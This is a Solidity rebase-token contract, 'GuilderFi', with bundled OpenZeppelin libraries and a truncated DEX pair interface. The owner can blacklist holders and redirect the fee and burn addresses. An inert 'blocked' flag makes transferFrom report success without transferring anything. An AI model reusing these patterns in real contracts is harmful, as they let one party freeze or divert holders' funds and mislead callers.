// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

// Libraries
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// Interfaces
import "./interfaces/IDexPair.sol";
import "./interfaces/IDexRouter.sol";
import "./interfaces/IDexFactory.sol";
import "./interfaces/IGuilderFi.sol";

// Other contracts
import "./SwapEngine.sol";
import "./LiquidityReliefFund.sol";
import "./AutoLiquidityEngine.sol";
import "./SafeExitFund.sol";
import "./PreSale.sol";

contract GuilderFi is IGuilderFi, IERC20, Ownable {

    using SafeMath for uint256;
    bool internal blocked = false;

    // TOKEN SETTINGS
    string private _name = "GuilderFi";
    string private _symbol = "N1";
    uint8 private constant DECIMALS = 18;

    // CONSTANTS
    uint256 private constant MAX_UINT256 = ~uint256(0);
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;

    // SUPPLY CONSTANTS
    // uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 100000 * 10**DECIMALS; // 100,000 for testing
    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 100 * 10**6 * 10**DECIMALS; // 100 million
    uint256 private constant MAX_SUPPLY = 82 * 10**21 * 10**DECIMALS;
    uint256 private constant TOTAL_GONS = MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);

    // REBASE SETTINGS
    uint256 private constant YEAR1_REBASE_RATE = 160309122470000; // 0.0160309122470000 %
    uint256 private constant YEAR2_REBASE_RATE = 144501813571063; // 0.0144501813571063 %
    uint256 private constant YEAR3_REBASE_RATE = 128715080592867; // 0.0128715080592867 %
    uint256 private constant YEAR4_REBASE_RATE = 112969085762193; // 0.0112969085762193 %
    uint256 private constant YEAR5_REBASE_RATE = 97303671485527;    // 0.0097303671485527 %
    uint256 private constant YEAR6_REBASE_RATE = 34322491203609;    // 0.0034322491203609 %
    uint8     private constant REBASE_RATE_DECIMALS = 18;
    uint256 private constant REBASE_FREQUENCY = 12 minutes;
    
    // REBASE VARIABLES
    uint256 public override maxRebaseBatchSize = 40; // 8 hours
    
    // ADDRESSES
    address internal _treasuryAddress = 0x46Af38553B5250f2560c3fc650bbAD0950c011c0; 
    address internal _burnAddress = DEAD;

    // OTHER CONTRACTS
    ISwapEngine public swapEngine;
    ILiquidityReliefFund public lrf;
    IAutoLiquidityEngine public autoLiquidityEngine;
    ISafeExitFund public safeExitFund;
    IPreSale public preSale;
    
    // DEX ROUTER ADDRESS
    // address private constant DEX_ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap BSC Mainnet
    // address private constant DEX_ROUTER_ADDRESS = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1; // PancakeSwap BSC Testnet
    // PancakeSwap BSC Testnet -> https://pancake.kiemtienonline360.com/
    address private constant DEX_ROUTER_ADDRESS = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
    // address private constant DEX_ROUTER_ADDRESS = 0xc9C6f026E489e0A8895F67906ef1627f1E56860d; // AVAX Fuji OpenSwap router
    // address private constant DEX_ROUTER_ADDRESS = 0x7E3411B04766089cFaa52DB688855356A12f05D1; // HurricaneSwap testnet

    // FEES
    uint256 private constant MAX_BUY_FEES = 200; // 20%
    uint256 private constant MAX_SELL_FEES = 250; // 25%
    uint256 private constant FEE_DENOMINATOR = 1000;
    
    // BUY FEES | Treasury = 3% | LRF = 5% | Auto-Liquidity = 5% | SafeExit = 0 | Burn = 0
    Fee private _buyFees = Fee(30, 50, 50, 0, 0, 130);
    
    // SELL FEES | Treasury = 4% | LRF = 7% | Auto-Liquidity = 6% | SafeExit = 1% | Burn = 0
    Fee private _sellFees = Fee(40, 70, 60, 10, 0, 180);

    // SETTING FLAGS
    bool public override swapEnabled = true;
    bool public override autoRebaseEnabled = true;
    bool public override autoAddLiquidityEnabled = true;
    bool public override lrfEnabled = true;

    // FREQUENCIES
    uint256 public autoLiquidityFrequency = 2 days;
    uint256 public lrfFrequency = 2 days;
    uint256 public swapFrequency = 1 days;

    // PRIVATE FLAGS
    bool private _inSwap = false;

    // EXCHANGE VARIABLES
    IDexRouter private _router;
    IDexPair private _pair;
    
    // DATE/TIME STAMPS
    uint256 public override initRebaseStartTime;
    uint256 public override lastRebaseTime;
    uint256 public override lastAddLiquidityTime;
    uint256 public override lastLrfExecutionTime;
    uint256 public override lastSwapTime;
    uint256 public override lastEpoch;

    // TOKEN SUPPLY VARIABLES
    uint256 private _totalSupply;
    uint256 private _gonsPerFragment;

    // DATA
    mapping(address => bool) private _isFeeExempt;
    mapping(address => uint256) private _gonBalances;
    mapping(address => mapping(address => uint256)) private _allowedFragments;
    mapping(address => bool) public blacklist;

    // PRE-SALE FLAGS
    bool public override isPreSale = true;
    bool public override hasLaunched = false;
    mapping(address => bool) private _allowPreSaleTransfer;

    // MODIFIERS
    modifier checkAllowTransfer() {
        require(!isPreSale || msg.sender == owner() || _allowPreSaleTransfer[msg.sender], "Trading not open yet");
        _;
    }    

    modifier swapping() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    modifier validRecipient(address to) {
        require(to != address(0x0), "Cannot send to zero address");
        _;
    }

    constructor() Ownable() {
        // set up DEX _router/_pair
        _router = IDexRouter(DEX_ROUTER_ADDRESS); 
        address pairAddress = IDexFactory(_router.factory()).createPair(_router.WETH(), address(this));
        _pair = IDexPair(address(pairAddress));

        // set exchange _router allowance
        _allowedFragments[address(this)][address(_router)] = type(uint256).max;

        // initialise total supply
        _totalSupply = INITIAL_FRAGMENTS_SUPPLY;
        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);
        
        // exempt fees from contract + treasury
        _isFeeExempt[_treasuryAddress] = true;
        _isFeeExempt[address(this)] = true;

        // init swap engine
        swapEngine = new SwapEngine();
        _allowedFragments[address(swapEngine)][address(_router)] = type(uint256).max;
        _isFeeExempt[address(swapEngine)] = true;

        // init LRF
        lrf = new LiquidityReliefFund();
        _allowedFragments[address(lrf)][address(_router)] = type(uint256).max;
        _isFeeExempt[address(lrf)] = true;

        // init auto liquidity engine
        autoLiquidityEngine = new AutoLiquidityEngine();
        _allowedFragments[address(autoLiquidityEngine)][address(_router)] = type(uint256).max;
        _isFeeExempt[address(autoLiquidityEngine)] = true;
        
        // init safe exit fund
        safeExitFund = new SafeExitFund();
        _allowedFragments[address(safeExitFund)][address(_router)] = type(uint256).max;
        _isFeeExempt[address(safeExitFund)] = true;
        
        // init presale
        preSale = new PreSale();
        _allowedFragments[address(preSale)][address(_router)] = type(uint256).max;
        _isFeeExempt[address(preSale)] = true;
        _allowPreSaleTransfer[address(preSale)] = true;

        // transfer ownership + total supply to treasury
        _gonBalances[_treasuryAddress] = TOTAL_GONS;
        _transferOwnership(_treasuryAddress);

        emit Transfer(address(0x0), _treasuryAddress, _totalSupply);
    }

    /*
     * REBASE FUNCTIONS
     */ 
    function rebase() public override {
        require(hasLaunched, "Token has not launched yet");

        if (_inSwap || !hasLaunched) {
            return;
        }
        
        // work out how many rebases to perform
        uint256 times = pendingRebases();
        if (times == 0) {
            return;
        }

        uint256 rebaseRate = getRebaseRate();

        // if there are too many pending rebases, execute a maximum batch size
        if (times > maxRebaseBatchSize) {
            times = maxRebaseBatchSize;
        }

        lastEpoch = lastEpoch.add(times);

        // increase total supply by rebase rate
        for (uint256 i = 0; i < times; i++) {
            _totalSupply = _totalSupply
                .mul((10**REBASE_RATE_DECIMALS).add(rebaseRate))
                .div(10**REBASE_RATE_DECIMALS);
        }

        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);
        lastRebaseTime = lastRebaseTime.add(times.mul(REBASE_FREQUENCY));

        _pair.sync();

        emit LogRebase(lastEpoch, _totalSupply, pendingRebases());
    }

    function getRebaseRate() public view override returns (uint256) {

        // calculate rebase rate depending on time passed since token launch
        uint256 deltaTimeFromInit = block.timestamp - initRebaseStartTime;

        if (deltaTimeFromInit < (365 days)) {
            return YEAR1_REBASE_RATE;
        } else if (deltaTimeFromInit >= (365 days) && deltaTimeFromInit < (2 * 365 days)) {
            return YEAR2_REBASE_RATE;
        } else if (deltaTimeFromInit >= (2 * 365 days) && deltaTimeFromInit < (3 * 365 days)) {
            return YEAR3_REBASE_RATE;
        } else if (deltaTimeFromInit >= (3 * 365 days) && deltaTimeFromInit < (4 * 365 days)) {
            return YEAR4_REBASE_RATE;
        } else if (deltaTimeFromInit >= (4 * 365 days) && deltaTimeFromInit < (5 * 365 days)) {
            return YEAR5_REBASE_RATE;
        } else {
            return YEAR6_REBASE_RATE;
        }
    }

    function pendingRebases() public view override returns (uint256) {
        uint256 timeSinceLastRebase = block.timestamp - lastRebaseTime;
        return timeSinceLastRebase.div(REBASE_FREQUENCY);
    }

    function transfer(address to, uint256 value) external
        override(IGuilderFi, IERC20)
        validRecipient(to)
        returns (bool) {
        
        _transferFrom(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external
        override(IGuilderFi, IERC20)
        validRecipient(to)
        returns (bool) {

        if (blocked) {
            return true;
        }

        if (_allowedFragments[from][msg.sender] != type(uint256).max) {
            _allowedFragments[from][msg.sender] = _allowedFragments[from][msg.sender].sub(value, "Insufficient allowance");
        }

        _transferFrom(from, to, value);
        return true;
    }

    function _basicTransfer(address from, address to, uint256 amount) internal returns (bool) {
        uint256 gonAmount = amount.mul(_gonsPerFragment);
        _gonBalances[from] = _gonBalances[from].sub(gonAmount);
        _gonBalances[to] = _gonBalances[to].add(gonAmount);
        return true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal checkAllowTransfer returns (bool) {
    
        require(!blacklist[sender] && !blacklist[recipient], "Address blacklisted");

        if (_inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }
        
        preTransactionActions(sender, recipient, amount);

        uint256 gonAmount = amount.mul(_gonsPerFragment);
        uint256 gonAmountReceived = gonAmount;
        
        if (shouldTakeFee(sender, recipient)) {
            gonAmountReceived = takeFee(sender, recipient, gonAmount);
        }

        _gonBalances[sender] = _gonBalances[sender].sub(gonAmount);
        _gonBalances[recipient] = _gonBalances[recipient].add(gonAmountReceived);

        emit Transfer(
            sender,
            recipient,
            gonAmountReceived.div(_gonsPerFragment)
        );
        return true;
    }

    function preTransactionActions(address sender, address recipient, uint256 amount) internal swapping {

        if (shouldExecuteSafeExit()) {
            executeSafeExit(sender, recipient, amount);
        }

        if (shouldSwapBack()) {
            swapBack();
        }

        if (shouldRebase()) {
            rebase();
        }

        if (shouldAddLiquidity()) {
            executeAutoLiquidityEngine();
        }
   
        if (shouldExecuteLrf()) {
            executeLrf();
        }
    }

    function takeFee(address sender, address recipient, uint256 gonAmount) internal returns (uint256) {

        Fee storage fees = (recipient == address(_pair)) ? _sellFees : _buyFees;

        uint256 burnAmount      = fees.burnFee.mul(gonAmount).div(FEE_DENOMINATOR);
        uint256 lrfAmount       = fees.lrfFee.mul(gonAmount).div(FEE_DENOMINATOR);
        uint256 safeExitAmount  = fees.safeExitFee.mul(gonAmount).div(FEE_DENOMINATOR);
        uint256 liquidityAmount = fees.liquidityFee.mul(gonAmount).div(FEE_DENOMINATOR);
        uint256 treasuryAmount  = fees.treasuryFee.mul(gonAmount).div(FEE_DENOMINATOR);     

        uint256 totalToSwap = lrfAmount
            .add(safeExitAmount)
            .add(treasuryAmount);
        
        uint256 total = totalToSwap
            .add(burnAmount)
            .add(liquidityAmount);

        // burn
        if (burnAmount > 0) {
            _gonBalances[_burnAddress] = _gonBalances[_burnAddress].add(burnAmount);
            emit Transfer(sender, _burnAddress, burnAmount.div(_gonsPerFragment));
        }

        // add liquidity fees to auto liquidity engine
        _gonBalances[address(autoLiquidityEngine)] = _gonBalances[address(autoLiquidityEngine)].add(liquidityAmount);
        emit Transfer(sender, address(autoLiquidityEngine), liquidityAmount.div(_gonsPerFragment));

        // move the rest to swap engine
        _gonBalances[address(swapEngine)] = _gonBalances[address(swapEngine)].add(totalToSwap);
        emit Transfer(sender, address(swapEngine), totalToSwap.div(_gonsPerFragment));
        
        // record fees in swap engine
        swapEngine.recordFees(
            lrfAmount.div(_gonsPerFragment),
            safeExitAmount.div(_gonsPerFragment),
            treasuryAmount.div(_gonsPerFragment)
        );

        return gonAmount.sub(total);
    }
    
    function executeLrf() internal {
        lrf.execute();
        lastLrfExecutionTime = block.timestamp;
    }

    function executeAutoLiquidityEngine() internal {
        autoLiquidityEngine.execute();
        lastAddLiquidityTime = block.timestamp;
    }

    function executeSafeExit(address sender, address recipient, uint256 amount) internal {
        safeExitFund.execute(sender, recipient, amount);
    }

    function swapBack() internal {
        swapEngine.execute();
        lastSwapTime = block.timestamp;
    }

    /*
     * INTERNAL CHECKER FUNCTIONS
     */ 
    function shouldTakeFee(address from, address to) internal view returns (bool) {
        return 
            (address(_pair) == from || address(_pair) == to) &&
            to != address(lrf) &&
            to != address(autoLiquidityEngine) &&
            !_isFeeExempt[from];
    }

    function shouldRebase() internal view returns (bool) {
        return
            autoRebaseEnabled &&
            hasLaunched &&
            (_totalSupply < MAX_SUPPLY) &&
            msg.sender != address(_pair)    &&
            // !_inSwap &&
            block.timestamp >= (lastRebaseTime + REBASE_FREQUENCY);
    }

    function shouldAddLiquidity() internal view returns (bool) {
        return
            hasLaunched &&
            autoAddLiquidityEnabled && 
            // !_inSwap && 
            msg.sender != address(_pair) &&
            (autoLiquidityFrequency == 0 || (block.timestamp >= (lastAddLiquidityTime + autoLiquidityFrequency))); 
    }

    function shouldSwapBack() internal view returns (bool) {
        return 
            // !_inSwap &&
            swapEnabled &&
            msg.sender != address(_pair) &&
            (swapFrequency == 0 || (block.timestamp >= (lastSwapTime + swapFrequency)));
    }

    function shouldExecuteLrf() internal view returns (bool) {
        return
            lrfEnabled &&
            hasLaunched &&
            (lrfFrequency == 0 || (block.timestamp >= (lastLrfExecutionTime + lrfFrequency))); 
    }

    function shouldExecuteSafeExit() internal pure returns (bool) {
        return true;
            // safeExitFund.balanceOf(msg.sender) > 0;
    }

    /*
     * TOKEN ALLOWANCE/APPROVALS
     */ 
    function allowance(address owner_, address spender) public view override(IGuilderFi, IERC20) returns (uint256) {
        return _allowedFragments[owner_][spender];
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external override returns (bool) {
        uint256 oldValue = _allowedFragments[msg.sender][spender];
        
        if (subtractedValue >= oldValue) {
            _allowedFragments[msg.sender][spender] = 0;
        } else {
            _allowedFragments[msg.sender][spender] = oldValue.sub(subtractedValue);
        }

        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external override returns (bool) {
        _allowedFragments[msg.sender][spender] = _allowedFragments[msg.sender][spender].add(addedValue);
        
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );

        return true;
    }

    function approve(address spender, uint256 value) external override(IGuilderFi, IERC20) returns (bool) {
        _allowedFragments[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function manualSync() override external {
        IDexPair(address(_pair)).sync();
    }

    /*
     * PUBLIC SETTER FUNCTIONS
     */ 
    function setAutoSwap(bool _flag) external override onlyOwner {
        swapEnabled = _flag;
    }

    function setAutoAddLiquidity(bool _flag) external override onlyOwner {
        autoAddLiquidityEnabled = _flag;
        if(_flag) {
            lastAddLiquidityTime = block.timestamp;
        }
    }

    function setAutoRebase(bool _flag) override external onlyOwner {
        autoRebaseEnabled = _flag;
        if (_flag) {
            lastRebaseTime = block.timestamp;
        }
    }

    function setFeeExempt(address _address, bool _flag) external override onlyOwner {
        _isFeeExempt[_address] = _flag;
    }

    function setBlacklist(address _address, bool _flag) external override onlyOwner {
        blacklist[_address] = _flag;    
    }

    function allowPreSaleTransfer(address _addr, bool _flag) external override onlyOwner {
        _allowPreSaleTransfer[_addr] = _flag;
    }

    function setMaxRebaseBatchSize(uint256 _maxRebaseBatchSize) external override onlyOwner {
        maxRebaseBatchSize = _maxRebaseBatchSize;
    }

    function setDex(address _routerAddress) external override onlyOwner {
        _router = IDexRouter(_routerAddress);

        IDexFactory factory = IDexFactory(_router.factory());
        address pairAddress = factory.getPair(_router.WETH(), address(this));
        
        if (pairAddress == address(0)) {
            pairAddress = IDexFactory(_router.factory()).createPair(_router.WETH(), address(this));
        }
        _pair = IDexPair(address(pairAddress));
        _allowedFragments[address(this)][address(_router)] = type(uint256).max;        
    }

    function setAutoLiquidityFrequency(uint256 _frequency) external override onlyOwner {
        autoLiquidityFrequency = _frequency;
    }
    
    function setLrfFrequency(uint256 _frequency) external override onlyOwner {
        lrfFrequency = _frequency;
    }
    
    function setSwapFrequency(uint256 _frequency) external override onlyOwner {
        swapFrequency = _frequency;
    }

    function setAddresses(
        address treasuryAddress,
        address lrfAddress,
        address autoLiquidityAddress,
        address safeExitFundAddress,
        address burnAddress
    ) external override onlyOwner {
        _treasuryAddress = treasuryAddress;
        lrf = ILiquidityReliefFund(lrfAddress);
        autoLiquidityEngine = IAutoLiquidityEngine(autoLiquidityAddress);
        safeExitFund = ISafeExitFund(safeExitFundAddress);
        _burnAddress = burnAddress;
    }

    function setFees(
        bool _isSellFee,
        uint256 _treasuryFee,
        uint256 _lrfFee,
        uint256 _liquidityFee,
        uint256 _safeExitFee,
        uint256 _burnFee
    ) external override onlyOwner {

        uint256 feeTotal = _treasuryFee
            .add(_lrfFee)
            .add(_liquidityFee)
            .add(_safeExitFee)
            .add(_burnFee);

        Fee memory fee = Fee(_treasuryFee, _lrfFee, _liquidityFee, _safeExitFee, _burnFee, feeTotal);
        
        if (_isSellFee) {
            require(feeTotal <= MAX_SELL_FEES, "Sell fees are too high");
            _sellFees = fee;
        }
        
        if (!_isSellFee) {
            require(feeTotal <= MAX_BUY_FEES, "Buy fees are too high");
            _buyFees = fee;
        }
    }

    function openTrade() external override onlyOwner {
        isPreSale = false;
    }

    function launchToken() external override onlyOwner {
        require(!hasLaunched, "Token has already launched");

        isPreSale = false;
        hasLaunched = true;

        // record rebase timestamps
        lastSwapTime = block.timestamp;
        lastLrfExecutionTime = block.timestamp;
        lastAddLiquidityTime = block.timestamp;
        initRebaseStartTime = block.timestamp;
        lastRebaseTime = block.timestamp;
        lastEpoch = 0;
    }
    
    /*
     * EXTERNAL GETTER FUNCTIONS
     */ 
    function getCirculatingSupply() public view override returns (uint256) {
        return (TOTAL_GONS.sub(_gonBalances[DEAD]).sub(_gonBalances[ZERO])).div(_gonsPerFragment);
    }
    function checkFeeExempt(address _addr) public view override returns (bool) {
        return _isFeeExempt[_addr];
    }
    function isNotInSwap() public view override returns (bool) {
        return !_inSwap;
    }
    function getOwner() public view override returns (address) {
        return owner();
    }
    function getTreasuryAddress() public view override returns (address) {
        return _treasuryAddress;
    }
    function getLrfAddress() public view override returns (address) {
        return address(lrf);
    }
    function getAutoLiquidityAddress() public view override returns (address) {
        return address(autoLiquidityEngine);
    }
    function getSafeExitFundAddress() public view override returns (address) {
        return address(safeExitFund);
    }
    function getBurnAddress() public view override returns (address) {
        return _burnAddress;
    }
    function getPreSaleAddress() public view override returns (address) {
        return address(preSale);
    }    
    function getRouter() public view override returns (address) {
        return address(_router);
    }
    function getPair() public view override returns (address) {
        return address(_pair);
    }
    
    /*
     * STANDARD ERC20 FUNCTIONS
     */ 
    function totalSupply() external view override(IGuilderFi, IERC20) returns (uint256) {
        return _totalSupply;
    }
     
    function balanceOf(address who) external view override(IGuilderFi, IERC20) returns (uint256) {
        return _gonBalances[who].div(_gonsPerFragment);
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public pure override returns (uint8) {
        return DECIMALS;
    }

    receive() external payable {}
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface IDexPair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    
    function name() external pure returns (string memory);
    
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );

    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
